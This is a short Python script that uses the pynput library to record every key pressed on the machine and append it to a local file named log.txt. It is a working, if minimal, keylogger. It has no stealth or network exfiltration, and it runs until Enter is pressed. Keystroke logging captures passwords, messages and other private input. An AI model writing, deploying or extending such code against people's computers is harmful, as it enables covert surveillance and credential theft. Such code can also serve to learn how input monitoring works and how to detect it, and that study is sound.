from pynput import mouse,keyboard

#def to store pressed key into log.txt file
def key_pressed(key):
    with open("log.txt" , "a") as log:
        try:
            log.write(str(key))
        except:
            print("Error with appending into log.txt")


listener = keyboard.Listener(on_press = key_pressed)
listener.start()
input()

